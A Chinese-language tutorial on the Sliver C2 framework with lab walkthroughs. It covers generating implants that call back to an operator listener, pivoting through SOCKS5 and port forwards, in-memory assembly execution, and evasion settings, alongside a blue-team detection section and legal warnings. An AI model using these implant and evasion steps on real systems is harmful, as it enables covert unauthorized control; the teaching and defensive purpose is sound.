# Sliver（现代化 C2 / 植入体框架）

> **一句话**：BishopFox 开源的 C2 框架——一个二进制同时提供**服务端 + 客户端**，支持 mTLS/HTTP(S)/DNS/WireGuard 多种隐蔽信道，植入体**动态编译且每次带唯一证书**，还内置 SOCKS 代理、端口转发、BOF 扩展与多人协作。
> **分类**：基础设施与 C2（Command and Control）｜ **Kali 包**：`sliver`（命令 `sliver-server`、`sliver-client`）｜ **官方文档**：<https://sliver.sh/> ｜ 项目：<https://github.com/BishopFox/sliver>

---

## 1. 它解决什么问题

拿到第一个落脚点之后，红队面对的是**工程问题**：怎么稳定控制、怎么不被发现、怎么协作、怎么横向。Metasploit 的 Meterpreter 太"经典"（特征被完整收录）；[`powershell-empire`](../08-后渗透/powershell-empire.md) 的 PowerShell 信道在现代 EDR 下也很吃力。

Sliver 的定位是**现代化的开源 C2**：

| 需求 | Sliver 的答案 |
|------|---------------|
| 隐蔽信道 | **mTLS**（默认，双向证书）、HTTPS、HTTP、**DNS**、WireGuard |
| 植入体形态 | **动态编译**（每次生成不同哈希），session（交互式）与 beacon（低频率轮询）两种 |
| 交叉平台 | Windows / Linux / macOS / ARM / MIPS |
| 内网穿透 | 内置 **`socks5`** 代理与 **`portfwd`** 端口转发（无需外部工具） |
| 扩展能力 | **Armory**（一键安装 BOF / .NET 工具 / aliases）、支持 `inline-execute` |
| 多人协作 | **multiplayer**（多操作员、权限分级、活动审计） |
| 凭据与战利品 | `loot` 集中管理 |
| 脚本化 | 完整 API、`--rc` 脚本、MCP 支持 |

对比同类：

| 工具 | 定位 | 差异 |
|------|------|------|
| **Sliver** | 开源 C2 | 现代信道、Go 编译、mTLS 默认；**服务端/客户端同一二进制** |
| **Metasploit** | 利用框架 + 基础 C2 | 强在打点；C2 能力弱、特征被广泛收录；见 [`../06-漏洞利用/metasploit-framework.md`](../06-漏洞利用/metasploit-framework.md) |
| **PowerShell Empire** | PS/Python 代理框架 | 经典无文件；现代检测覆盖好；见 [`../08-后渗透/powershell-empire.md`](../08-后渗透/powershell-empire.md) |
| **Cobalt Strike** | 商业 C2 | 生态最成熟（Beacon/BOF/Malleable C2），但价格高、滥用广 |
| **`chisel` / `ligolo-ng`** | 纯隧道 | 只解决"通路"，不含植入体与会话管理；见 [`../08-后渗透/chisel.md`](../08-后渗透/chisel.md)、[`../08-后渗透/ligolo-ng.md`](../08-后渗透/ligolo-ng.md) |

**关键认知**：**Sliver 只是 C2 的"控制平面"**。它负责维持信道、管理会话、下发指令。真正的"打点"（初始访问）通常仍由 Metasploit、`impacket`、Web 漏洞利用完成 —— 两者是**互补**关系。

---

## 2. 工作原理

```
┌──────────── Kali（服务端 + 客户端）─────────────────┐
│ sliver-server                                       │
│   ├─ 生成/编译植入体（Go 编译 + 唯一 X.509 证书）      │
│   ├─ 监听器（Listener）：mtls / https / http / dns / wg │
│   ├─ 会话管理（sessions / beacons）                   │
│   ├─ 多人协作（operators / multiplayer）              │
│   └─ 数据库（会话、loot、任务历史）                    │
│ sliver-client                                       │
│   └─ 控制台（命令/别名/脚本/API）                      │
└─────────────────────────────────────────────────────┘
        ▲ 植入体（implant）主动回连（默认 mTLS）
        │
┌───────┴──────── 目标主机（Windows / Linux / macOS）──┐
│ 植入体（Go 静态二进制）                                │
│  · session：持久长连接，交互式                         │
│  · beacon：定时回连（间隔+抖动），隐蔽性更好            │
│  · 能力：文件、进程、凭据、截屏、键盘、隧道、注入…        │
└─────────────────────────────────────────────────────┘
```

### 关键概念

| 概念 | 含义 | 说明 |
|------|------|------|
| **Implant（植入体）** | 目标上运行的客户端 | **每次生成都是动态编译**：证书唯一 → 文件哈希唯一（**比固定样本难做静态特征**） |
| **Session** | 交互式会话（长连接） | 操作及时；但**长连接易被网络行为分析发现** |
| **Beacon** | 低频率轮询会话 | 定时回连 + 抖动（jitter），更像正常心跳，**更隐蔽** |
| **Listener** | 服务端监听器 | `mtls`（默认）、`https`、`http`、`dns`、`wg`（WireGuard） |
| **Profile** | 植入体配置模板 | 把 `--mtls`/`--os`/`--arch` 等固化，便于复用 |
| **Stage / Stager** | 分段投递 | 小 stager 先落地，再拉取完整植入体（**规避文件大小限制**） |
| **Armory** | 扩展商店 | 一键安装 BOF、.NET 工具、aliases（**离线环境需自建源**） |
| **Multiplayer / Operator** | 多人协作 | 生成操作员配置，其他人在各自 `sliver-client` 连同一服务端 |
| **Loot** | 战利品管理 | 收集到的凭据/文件集中存放（**注意：这本身是高敏感数据**） |

### 加密与身份（**Sliver 的设计亮点**）

- 首次运行 `sliver-server` 时，会生成**每个实例唯一的 CA**，并为每个植入体签发**唯一证书**。
- 默认 **mTLS**：植入体与服务端双向验证证书 → 中间人/冒名服务端都难以生效。
- 证书可**导出/导入**（`export-ca` / `import-ca`），便于迁移或团队共用（**导出后要极其小心保管**）。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install sliver
command -v sliver-server sliver-client
```

```console
root@kali:~# sliver-server -h
Usage:
  sliver-server [flags]
  sliver-server [command]

Available Commands:
  builder     Start the process as an external builder
  completion  Generate the autocompletion script for the specified shell
  daemon      Force start server in daemon mode
  export-ca   Export certificate authority
  help        Help about any command
  import-ca   Import certificate authority
  operator    Generate operator configuration files
  unpack      Unpack assets and exit
  version     Print version and exit
```

```console
root@kali:~# sliver-client -h
Usage:
  sliver-client [flags]
  sliver-client [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  console     Start the sliver client console
  help        Help about any command
  implant     Implant commands
  import      Import a client configuration file
  mcp         Start the MCP stdio server
  version     Print version and exit
```

最短上手路径：

```bash
# ① 启动服务端（首次会生成 CA，并直接进入交互控制台）
sudo sliver-server
```

```console
[*] Generating new client certificate, please wait ...
[*] Alphanumerical random password: xxxxxxxx
[*] IMPORTANT: Save this password! It encrypts your client certificate. It will not be used in this session.

    Sliver is a shell for CISOs and Red Teams. Type 'help' for more info.

sliver >
```

```console
# ② 起一个 mTLS 监听器（默认端口 8888）
sliver > mtls --lport 8888
[*] Starting mTLS listener ...
[*] Successfully started job #1

# ③ 生成 Windows 植入体（指向你的监听器 IP）
sliver > generate --mtls 192.168.56.5:8888 --os windows --arch amd64 --save /tmp/lab/impl.exe
[*] Generating new windows/amd64 implant binary
[*] Build completed in 22s
[*] Implant saved to /tmp/lab/impl.exe

# ④ 把植入体投递到授权靶机并执行，然后看会话
sliver > sessions
 ID         Name          Transport   Remote Address        Hostname   Username
 1a2b3c4d   TALL_TIGER    mtls        192.168.56.50:51234   WEB01      CONTOSO\jdoe

# ⑤ 进入会话
sliver > use 1a2b3c4d
[*] Active session TALL_TIGER (1a2b3c4d)
sliver (TALL_TIGER) > info
```

`sliver-client`（另一个终端连同一服务端）：

```bash
# 服务端用 daemon 模式跑（不占终端）
sudo sliver-server daemon &

# 客户端启动控制台
sliver-client
```

> **多操作员**：服务端执行 `new-operator --name alice --lhost 192.168.56.5` 生成配置文件 → 对方 `sliver-client import <file>`（见第 4 节）。

---

## 4. 核心参数详解

### 4.1 `sliver-server` 子命令

| 子命令 | 作用 | 使用建议 |
|--------|------|----------|
| （无参数） | **启动服务端并进入控制台** | 单机最常用 |
| `daemon` | 以后台守护方式启动服务端 | 多人协作/长期运行时用 |
| `operator` | **生成操作员配置**（给其他 `sliver-client` 用） | 团队协作 |
| `export-ca` | **导出 CA**（证书+密钥） | 迁移/备份；**导出文件是最高机密** |
| `import-ca` | 导入已有 CA | 恢复/团队共用 |
| `builder` | 作为**外部构建器**运行（把编译放到别的机器） | 把编译分散、避免服务端被特征识别 |
| `unpack` | 解包内嵌资产（如 armory 包） | 离线环境 |
| `version` | 版本 | —— |

### 4.2 `sliver-client` 子命令

| 子命令 | 作用 | 使用建议 |
|--------|------|----------|
| `console` | **启动交互控制台**（默认行为） | 日常使用 |
| `import <file>` | **导入操作员配置** | 连到别人的服务端 |
| `implant` | 植入体相关子命令（如查看/生成相关操作） | 视版本 |
| `mcp` | 启动 **MCP stdio 服务**（把 Sliver 能力暴露给 LLM/工具） | 自动化实验 |
| `version` | 版本 | —— |
| `--rc <file>` | 启动时执行**资源脚本** | 自动化（把常用命令写成脚本） |

### 4.3 控制台核心命令（**分类记忆**）

**① 监听器（Listener）**

| 命令 | 作用 | 关键参数 |
|------|------|----------|
| `mtls` | **mTLS 监听器（默认/推荐）** | `--lport <port>`、`--lhost` |
| `https` | HTTPS 监听器 | `--lport 443`、`--domain example.com`、`--website` |
| `http` | 明文 HTTP | 仅内网/测试 |
| `dns` | **DNS 监听器**（隐蔽性最强，速度最慢） | `--domains`、`--lport 53` |
| `wg` | WireGuard 监听器 | `--lport`、`--lhost` |
| `jobs` | 查看运行中的监听器 | —— |
| `jobs -k <id>` | 停止某个监听器 | —— |

**② 生成植入体**

| 命令 | 作用 | 关键参数 |
|------|------|----------|
| `generate` | **生成植入体** | `--mtls/--http/--https/--dns <addr>`、`--os`、`--arch`、`--format`、`--save`、`--name`、`--seconds/--jitter`（beacon）、`--evasive`、`--debug` |
| `profiles new` | 创建**配置模板** | 把参数固化，便于批量生成 |
| `profiles` | 查看模板 | —— |
| `implants` | 查看已生成的植入体记录 | —— |
| `stage-listener` | 起分段投递的 stager 监听 | 配合小体积投递 |
| `regenerate` | 用已有配置重新编译（换证书/换哈希） | —— |
| `armory install <name>` | **安装扩展**（BOF/工具/alias） | 需要网络或自建源 |
| `armory` / `aliases` | 查看已安装扩展 | —— |

**③ 会话与任务**

| 命令 | 作用 | 说明 |
|------|------|------|
| `sessions` | 列出**交互会话** | 长连接 |
| `beacons` | 列出 **beacon** | 低频率回连 |
| `use <id>` | 进入某个会话 | 提示符变为 `sliver (NAME) >` |
| `background` / `sessions` | 退出当前会话 | —— |
| `interactive` | 切换 session/beacon 交互模式 | —— |
| `info` | 主机与进程信息 | 会话第一步 |
| `tasks` | 查看任务结果 | 异步任务 |
| `kill` / `rm-session` | 结束会话 | —— |

**④ 会话内操作（`use` 之后）**

| 命令 | 作用 |
|------|------|
| `whoami` / `getuid` / `getgid` | 当前身份 |
| `pwd` / `ls` / `cd` / `rm` / `mkdir` / `cat` | 文件系统操作 |
| `upload <local> <remote>` / `download <remote> [local]` | 文件传输 |
| `ps` / `procdump` | 进程列表 / 进程转储 |
| `migrate <pid>` | 迁移到其它进程 |
| `execute <path> [args]` | 执行程序（**新进程**） |
| `shell` | 起一个 shell（交互性看环境） |
| `netstat` / `ifconfig` | 网络信息 |
| `env` / `getenv` | 环境变量 |
| `screenshot` | 截屏 |
| `keylogger`（视平台/扩展） | 键盘记录 |
| `services` / `reg`（Windows） | 服务/注册表 |
| `inline-execute <file.o> [args]` | **执行 BOF**（内存执行，不落地） |
| `execute-assembly <file.exe>` | 内存执行 .NET 程序集 |
| `portfwd add/rm/list` | **端口转发** |
| `socks5 start/stop` | **在植入体侧起 SOCKS5 代理**（内网跳板） |
| `pivot`（视版本） | 以该会话为跳板建立新监听 |
| `loot` / `loot add` / `loot rm` | **战利品管理** |

**⑤ 服务端/团队/其他**

| 命令 | 作用 | 使用建议 |
|------|------|----------|
| `jobs` | 监听器与任务总览 | —— |
| `multiplayer` | **多人协作模式** | 服务端开启后，多个 operator 共享会话 |
| `new-operator` | 生成操作员配置 | 团队分工 |
| `operators` | 操作员列表 | —— |
| `canaries` | DNS canary（检测"域名是否被解析/被防御方探测"） | 判断是否被分析 |
| `websites` / `website add-content` | **托管网站内容**（配合 https 监听器做"看起来正常"的站点） | 伪装成功率的关键 |
| `hosts` | 虚拟主机映射 | 多域伪装 |
| `reaction` | **自动化触发**（如"新会话上线就自动执行某命令"） | 授权演练中减少重复劳动 |
| `scripts` / `--rc` | 脚本化 | 把常用流程固化 |
| `loot` / `ops` | 战利品 / 操作日志 | 报告素材 |
| `exit` | 退出控制台 | —— |

> **版本差异**：Sliver 迭代较快，**具体子命令与参数以控制台内 `help` 与 Tab 补全为准**（`help`, `<command> --help`）。

---

## 5. 实战演练

> **环境声明**：以下全部在**完全隔离的自建实验室**中进行——**必须是你自己的攻击机（Kali）+ 自己的靶机（自建 Windows/Linux 虚拟机，Host-Only 网络）+ 明确授权**。
> **Sliver 是后门框架，投递植入体 = 非法控制计算机信息系统。** 未授权使用可能触犯《刑法》第 285 条（**非法控制计算机信息系统罪**）、第 286 条，详见文末。
> **建议**：把实验环境放在**断网或独立虚拟网络**中；实验结束后**回滚快照**。

### 场景 1：最小闭环 —— 从生成植入体到拿到会话

**Step 1：起服务端**

```bash
sudo sliver-server
```

```console
[*] Generating new client certificate, please wait ...
[*] Alphanumerical random password: 7kQ2mZ9p
[*] IMPORTANT: Save this password! It encrypts your client certificate.

    Sliver is a shell for CISOs and Red Teams. Type 'help' for more info.

sliver >
```

**解读**：**第一行的随机口令一定要存好**——它加密客户端证书，丢了就要重新初始化。**服务端的 CA 与证书是这个实验的最高机密。**

**Step 2：起 mTLS 监听器**

```console
sliver > mtls --lport 8888
[*] Starting mTLS listener ...
[*] Successfully started job #1
sliver > jobs
 ID   Name   Protocol   Port
 1    mtls   tcp        8888
```

**Step 3：生成植入体**

```console
sliver > generate --mtls 192.168.56.5:8888 --os windows --arch amd64 \
         --name lab-implant --save /tmp/lab/lab-implant.exe
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 19s
[*] Implant saved to /tmp/lab/lab-implant.exe
```

```bash
ls -lh /tmp/lab/lab-implant.exe
sha256sum /tmp/lab/lab-implant.exe
```

```console
1.2M  /tmp/lab/lab-implant.exe
a1b2c3...  /tmp/lab/lab-implant.exe
```

**解读（三个可验证的要点）**：

| 观察 | 说明 |
|------|------|
| `Symbol obfuscation is enabled` | 符号混淆（提高逆向成本） |
| 生成要 ~20 秒 | 因为它是**现场用 Go 编译**的（不是从固定样本里拷贝） |
| 记录 `sha256sum` | **每个植入体的哈希都不同**（证书唯一）→ 静态哈希黑名单难以奏效（**这正是 Sliver 相对"固定木马样本"的优势**） |

**Step 4：投递并检查会话**（在授权 Windows 靶机上执行）

```console
# Windows 靶机（授权环境）
C:\Users\jdoe> C:\temp\lab-implant.exe
```

```console
sliver > sessions
 ID         Name          Transport   Remote Address        Hostname   Username          Last Check-in
 1a2b3c4d   TALL_TIGER    mtls        192.168.56.50:51234   WEB01      CONTOSO\jdoe      1s ago
```

**Step 5：进入会话并做基础枚举**

```console
sliver > use 1a2b3c4d
sliver (TALL_TIGER) > info
sliver (TALL_TIGER) > whoami
CONTOSO\jdoe
sliver (TALL_TIGER) > pwd
C:\Users\jdoe
sliver (TALL_TIGER) > ps
sliver (TALL_TIGER) > netstat
```

**解读**：到这里就完成了 **C2 的最小闭环**：监听器 → 植入体 → 会话 → 命令下发。**后续所有动作都在这个会话里进行。**

### 场景 2：从 C2 到内网横向（socks5 + portfwd + BOF）

**2a. 在内网跳板上开 SOCKS5（**Sliver 内置，不需要 chisel**）**

```console
sliver (TALL_TIGER) > socks5 start --port 1080
[*] Started SOCKS5 server on 127.0.0.1:1080
```

```bash
# Kali 上（注意：SOCKS 监听在 Kali 侧）
ss -lntp | grep 1080
```

```console
LISTEN 0 4096 127.0.0.1:1080 0.0.0.0:*
```

```bash
# 用 proxychains 打内网（nmap 必须 -sT）
proxychains4 -q nmap -sT -Pn -p 445,5985 10.10.20.5
proxychains4 -q nxc smb 10.10.20.5 -u jdoe -p 'Summer2024!' --shares
```

见 [`../08-后渗透/proxychains4.md`](../08-后渗透/proxychains4.md)。

**2b. 定点端口转发（更稳、更快）**

```console
sliver (TALL_TIGER) > portfwd add --remote 10.10.20.5:3389 --bind 127.0.0.1:13389
[*] Port forward added: 127.0.0.1:13389 -> 10.10.20.5:3389
```

```bash
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'Passw0rd!' /cert:ignore
```

**解读**：**Sliver 自带隧道能力**，所以在 C2 场景里通常**不需要再单独上 chisel/ligolo**（除非要打更复杂的多层网络或需要 TUN 语义）。对比见 [`../08-后渗透/chisel.md`](../08-后渗透/chisel.md)、[`../08-后渗透/ligolo-ng.md`](../08-后渗透/ligolo-ng.md)。

**2c. 内存执行 BOF/程序集（**更隐蔽的落地方式**）**

```console
# 安装 Armory 扩展（需网络；离线环境用 unpack 或自建源）
sliver > armory install seatbelt
```

```console
# 内存执行 .NET 程序集（不落盘）
sliver (TALL_TIGER) > execute-assembly /opt/tools/Seatbelt.exe -group=all
```

```console
# 执行 BOF（内存执行 C 写的 Beacon Object File）
sliver (TALL_TIGER) > inline-execute /opt/tools/whoami.o
```

**解读**：`execute-assembly`/`inline-execute` 的收益是**不写盘**（绕过文件扫描类检测），但**行为特征（.NET 反射加载、内存执行）仍是强 EDR 信号**。

**2d. 战利品与自动化**

```console
sliver (TALL_TIGER) > download C:\Users\jdoe\Documents\config.xml
sliver (TALL_TIGER) > loot
sliver > reaction
# 可配置「新会话上线自动执行某命令」（授权演练中减少重复劳动）
```

```bash
# 服务端的操作日志与 loot 目录（注意这是最高敏感数据）
sudo find /root -path '*sliver*' -maxdepth 4 2>/dev/null | head
```

### 场景 3：团队协作、脚本化与"更隐蔽"的使用方式

**3a. 多人协作（multiplayer）**

```console
# 服务端（daemon 模式跑在服务器上）
sudo sliver-server daemon &
```

```console
# 服务端控制台里生成操作员配置
sliver > new-operator --name alice --lhost 192.168.56.5
[*] Generating new client certificate for alice ...
[*] Saved new operator config to: alice_192.168.56.5.cfg
```

```bash
# 把 alice_192.168.56.5.cfg 安全交给 alice（不要用明文邮件/IM！）
```

```bash
# alice 在自己的机器上
sliver-client import alice_192.168.56.5.cfg
sliver-client
```

```console
sliver (alice) > sessions      ← 看到共享的会话
sliver (alice) > operators     ← 看到所有操作员
```

**解读**：`multiplayer` 是 Sliver 相对 Metasploit 的显著优势——**多操作员、权限分级、操作可审计**（谁做了什么）。团队成员**不需要共享同一个证书**。

**3b. 脚本化（把流程固化成 rc 文件）**

```bash
cat > /tmp/lab/setup.rc <<'EOF'
# Sliver 资源脚本（sliver-client --rc setup.rc）
mtls --lport 8888
jobs
generate --mtls 192.168.56.5:8888 --os windows --arch amd64 --save /tmp/lab/impl.exe
EOF
sliver-client --rc /tmp/lab/setup.rc
```

**解读**：`--rc` 与 Sliver 的 API 让它**能接进自动化流程**（例如 CTF 环境自动布置、演练前批量生成植入体（**仅限于自有靶机**））。

**3c. 更隐蔽的配置（**理解"防御方在防什么"**）**

| 手法 | 配置 | 防御方对应检测 |
|------|------|----------------|
| 用 **beacon** 代替 session | `generate ... --beacon --seconds 60 --jitter 30` | 定时心跳的网络行为分析（**固定间隔是特征**，抖动会削弱它） |
| 用 **HTTPS + 自有域名** | `https --lport 443 --domain cdn.drill.example.com --website` | TLS 指纹（JA3/JA4）、域名信誉、流量与域名语义不符 |
| **伪装网站内容** | `website add-content --website cdn.drill.example.com --file index.html` | 反连时对端不像正常 Web 服务 |
| **DNS 信道** | `dns --domains d.drill.example.com --lport 53` | DNS 查询频率/长度异常（**DNS 是少数难以完全屏蔽的信道**） |
| **外部 builder 分散编译** | `sliver-server builder` | 编译特征与运行分离 |
| 符号混淆 / evasion | `--evasive`、`--symbol-obfuscate` | 静态特征（**行为特征仍会命中**） |

**⚠️ 现实提醒**：上述手法在**现代 EDR + 网络行为分析 + TLS 指纹**面前**存活率有限**。Sliver 的价值在于**它能帮你验证这些防护是否真的有效**（这恰恰是防守方最需要的信息）。

---

## 6. 输出解读

### 6.1 会话列表

```console
sliver > sessions
 ID         Name          Transport   Remote Address        Hostname   Username          Last Check-in
 1a2b3c4d   TALL_TIGER    mtls        192.168.56.50:51234   WEB01      CONTOSO\jdoe      1s ago
```

| 字段 | 含义 | 用途 |
|------|------|------|
| `ID` | 短 ID（用于 `use`） | —— |
| `Name` | 随机代号（如 `TALL_TIGER`） | 报告与沟通中的标识（**比 IP 更适合在团队内引用**） |
| `Transport` | 信道类型（`mtls`/`https`/`dns`…） | 判断隐蔽性与稳定性 |
| `Remote Address` | 目标地址与外连端口 | 网络侧检测线索 |
| `Hostname` / `Username` | 身份 | 判断权限级别 |
| `Last Check-in` | 最后回连时间 | **beacon 的间隔是否正常**（异常可能说明被阻断） |

**判断成功**：出现 `Last Check-in: 1s ago`（或 beacon 按预期间隔更新）说明**信道稳定**。

### 6.2 `info` 输出

通常包含：主机名、操作系统与版本、架构、进程 PID 与路径、当前用户与权限、植入体名称/ID、信道信息。**这是"我在哪、我是什么权限"的答案**，也是报告里资产条目的来源。

### 6.3 关键信号

| 现象 | 含义 | 下一步 |
|------|------|--------|
| 会话秒断 | 植入体被杀 / 网络被阻断 / EDR 处置 | 换 beacon、换信道、延长间隔；记录为"防御生效" |
| `jobs` 里监听器消失 | 监听器被手动关闭或崩溃 | 重新起；检查端口占用 |
| beacon 间隔越来越长 | 网络质量差或被限速 | 调整 `--seconds/--jitter` |
| `armory install` 失败 | 无网络 / 源不可达 | 用离线包 `unpack` 或自建源 |
| `execute-assembly` 报错 | .NET 版本不符 / 被杀 | 换 BOF；或改用平台原生方式 |

---

## 7. 与其他工具配合

```
① 打点（初始访问）—— Sliver 不负责这部分
   metasploit / impacket / web 漏洞利用 / 社工（gophish/set）
        │  拿到一个执行能力（命令执行、shell、WinRM…）
        ▼
② C2（本文）
   sliver-server + sliver-client
     ├─ generate → 植入体（唯一证书、动态编译）
     ├─ mtls/https/dns 监听器
     ├─ sessions / beacons（session 与低频率 beacon）
     ├─ socks5 / portfwd（内网跳板）
     ├─ armory / inline-execute / execute-assembly（扩展）
     └─ multiplayer（团队协作）
        │
③ 内网横向
   proxychains4 → nxc / impacket / evil-winrm    ← ../08-后渗透/
   （也可继续用 Sliver 的 pivot 与会话管理）
        │
④ 凭据与提权
   mimikatz / lsassy（Sliver 可内存执行相关工具）  ← ../08-后渗透/mimikatz.md
        │
⑤ 记录与报告
   cherrytree / dradis                            ← ../11-社会工程与报告/
```

**与其它隧道工具的关系**：

| 场景 | 建议 |
|------|------|
| 已有 C2 会话，需要访问内网 | **优先用 Sliver 的 `socks5` / `portfwd`**（少一个组件） |
| 需要 TUN 式路由 / 多层网段 / UDP | 用 [`ligolo-ng`](../08-后渗透/ligolo-ng.md) |
| 需要单个轻量二进制做隧道（无 C2） | 用 [`chisel`](../08-后渗透/chisel.md) |
| 要把 TCP 工具塞进代理 | [`proxychains4`](../08-后渗透/proxychains4.md) |

- 其它 C2：[`../08-后渗透/powershell-empire.md`](../08-后渗透/powershell-empire.md) ｜ 载荷生成：[`../06-漏洞利用/msfvenom.md`](../06-漏洞利用/msfvenom.md)
- 隧道与代理：[`../08-后渗透/chisel.md`](../08-后渗透/chisel.md)、[`../08-后渗透/ligolo-ng.md`](../08-后渗透/ligolo-ng.md)、[`../08-后渗透/proxychains4.md`](../08-后渗透/proxychains4.md)
- 基础设施（重定向器/托管）：[`socat.md`](socat.md)、[`apache2.md`](apache2.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| 会话不上线 | 植入体里的地址不可达 / 端口被拦 / 杀软删除 | 靶机上 `Test-NetConnection <kali> -Port 8888`；换端口（443）；检查落地是否成功 |
| `generate` 报编译失败 | 缺 Go 环境/资产未解包 | 运行 `sliver-server unpack`；或检查磁盘空间与权限 |
| `Sliver is not running` / 客户端连不上 | 服务端没起或端口不符 | `sudo sliver-server` / `daemon`；检查 `~/.sliver-client/configs/` 配置 |
| 忘记客户端证书口令 | 初始化时的随机口令 | **无法找回** → 重新初始化（会换 CA，**所有旧植入体失联**） |
| `export-ca` 文件丢了 | CA 是最高机密 | 从备份恢复；没有备份就只能重建（旧植入体全部作废） |
| `armory install` 失败 | 无外网/源不可达 | 用离线包；或在可联网环境 `unpack` 后拷贝 |
| 会话极不稳定 | 长连接被中间设备干掉 / 网络抖动 | 改 **beacon**（带 jitter）；缩短/延长间隔；换信道 |
| `socks5 start` 后工具连不上内网 | 目标侧到内网不可达 / 端口写错 | 在会话里 `netstat`/`ifconfig` 确认；先 `portfwd` 定点验证 |
| `execute-assembly` 报 .NET 错误 | 目标 .NET 版本不符 | 换 32/64 位版本；或改用 BOF |
| 植入体秒被杀 | EDR/AV 特征命中 | 说明**防御有效**（这是有价值的结果）；授权演练中如实记录 |
| 多人同时操作同一会话混乱 | 没有协作规范 | 用 `multiplayer` + 明确分工；操作记录见 `ops` |
| 生成的文件很大（1–10 MB） | Go 静态二进制的固有体积 | 用 stager/分段投递，或 `--format` 选择更小的形式 |
| 服务端被暴露到公网 | 配置疏忽 | **绝不把 `sliver-server` 直接暴露公网**；用重定向器（见 [`apache2.md`](apache2.md)、[`socat.md`](socat.md)） |

---

## 9. 防御视角（蓝队）

Sliver 是**现代 C2 的代表**，也因此成为检验蓝队能力的"高标准靶子"。**下面的每一条都是真实可落地的检测与缓解措施。**

| Sliver 的做法 | 检测信号 | 缓解措施 |
|---------------|----------|----------|
| **mTLS 长期连接** | 内网主机**出站**到固定 IP:端口的长连接；TLS 客户端证书（服务端/客户端双向认证在流量上可观察）；JA3/JA4 指纹 | **出站白名单 + 强制正向代理**；TLS 检查（**能看到证书与 SNI**）；长连接基线告警 |
| **HTTPS + 伪装域名** | SNI 与目标域名语义不符（如 `cdn.` 域却做长连接 POST）；证书是新签发/自签；域名信誉差 | 域名信誉/威胁情报；TLS 指纹；**出口 DNS 与代理日志关联分析** |
| **DNS 信道** | 高频/异常长度的 DNS 查询（TXT/NULL/A 记录）、单域名子域查询量暴增、查询间隔规律 | **DNS 只允许企业 DNS**；限制出站 53；DNS 日志分析与异常检测 |
| **植入体落地** | 新出现的可执行文件（尤其无签名、Go 编译特征、体积 1–10 MB）；`%TEMP%`/`%APPDATA%` 下执行 | **应用白名单（WDAC/AppLocker）**、EDR、文件哈希情报（**注意哈希每次都变，需靠行为特征**） |
| **进程注入 / migrate** | `OpenProcess`+`VirtualAllocEx`+`WriteProcessMemory`+`CreateRemoteThread`/`QueueUserAPC`（Sysmon 8/10） | EDR 行为规则；**Credential Guard + LSASS PPL**（保护 LSASS） |
| **execute-assembly / inline-execute** | .NET 程序集反射加载、无文件执行、`clr.dll` 被非托管进程加载 | AMSI（**不要关**）、EDR 内存扫描、WDAC/CLM |
| **socks5 / portfwd** | 单主机大量内网连接（横向放大）；异常监听端口 | **网络分段/微隔离**；东西向流量审计；主机防火墙 |
| **BOF 执行** | 异常内存分配 + 执行（RWX 页面） | EDR 内存保护（CFG/CET）、页权限监控 |
| **多人协作（多操作员）** | 同一 C2 基础设施被多个来源访问 | 网络侧关联分析（同一域名/IP 的多个来源） |
| **服务端暴露** | 暴露在公网的 Sliver 服务端口（容易被扫描到） | —— 这是攻击方的问题，但对蓝队是**威胁情报线索** |

**蓝队落地清单（按 ROI 排序）**：

1. **出站流量治理**：**正向代理 + 出站白名单**。这一条对 Sliver/Chisel/Ligolo 等**所有** C2 与隧道工具都有效，是最高 ROI 的控制项；
2. **应用白名单（WDAC/AppLocker）**：直接阻止未签名植入体执行（Sliver 植入体通常无有效签名）；
3. **EDR 行为规则**：盯住「进程注入 + LSASS 访问 + 内存执行」这三类行为（它们比"文件哈希"可靠得多）；
4. **DNS 治理**：内网只允许企业 DNS，监控异常查询模式；
5. **凭据保护**：Credential Guard + LSASS PPL + LAPS（限制抓到凭据后的横向能力）；
6. **演练验证**：用 Sliver 在隔离环境里**测试你的检测能力**——**能发现才有意义**；发现不了就去改规则。

**重要提示（诚实的技术判断）**：Sliver 的植入体**每次哈希都不同**，因此**基于文件哈希的黑名单基本无效**。防御必须建立在**行为特征 + 网络特征 + 白名单**之上。

---

## 10. 参考

- Sliver 官方文档（教程、命令参考、Armory）：<https://sliver.sh/>
- Sliver 仓库：<https://github.com/BishopFox/sliver>
- BishopFox 官方博客（设计理念与更新）：<https://bishopfox.com/blog>
- Kali 工具页：<https://www.kali.org/tools/sliver/>
- 本地命令：`sliver-server -h`、`sliver-client -h`，以及控制台内的 `help`、`<command> --help`
- MITRE ATT&CK · 应用层协议（T1071）、协议隧道（T1572）、非应用层协议（T1095）、进程注入（T1055）
- 相关教程：[`socat.md`](socat.md)、[`apache2.md`](apache2.md)、[`../08-后渗透/powershell-empire.md`](../08-后渗透/powershell-empire.md)、[`../08-后渗透/chisel.md`](../08-后渗透/chisel.md)、[`../08-后渗透/ligolo-ng.md`](../08-后渗透/ligolo-ng.md)

## ⚠️ 法律与伦理（**本节请完整阅读**）

**Sliver 生成的是后门。** 投递、运行、维持植入体，在未授权环境下可能触犯：

- 《刑法》**第 285 条**：非法侵入计算机信息系统罪、非法获取计算机信息系统数据罪、**非法控制计算机信息系统罪**（Sliver 的典型行为恰好符合"非法控制"）；
- 《刑法》**第 286 条**：破坏计算机信息系统罪；
- 《网络安全法》第 27 条、《数据安全法》《个人信息保护法》（植入体常会收集主机信息与凭据）。

**必须遵守的前提**：

1. **有书面授权的红队/渗透测试**，且授权书**明确允许"C2 植入与持久化"**（很多授权书默认不包含）；
2. **在完全隔离的实验室环境**做学习与验证（自己的攻击机 + 自己的靶机 + Host-Only 网络 + **实验后回滚快照**）；
3. **绝不把 `sliver-server` 暴露到公网**（那会使它成为他人的攻击基础设施，并给你带来额外法律风险）；
4. **CA 与操作员配置是最高机密**：`export-ca` 的产物、`*.cfg` 操作员配置**必须加密保管**，不得通过明文邮件/IM 传输；
5. **战利品（loot）与凭据按最高敏感数据处理**：加密存储、限时销毁、报告中脱敏；
6. **测试结束必须清理**：终止会话、删除植入体、清理持久化项、停止监听器，并保留清理记录；
7. **不做"顺手用一下"**：任何超出授权范围的动作都不是测试，而是犯罪。
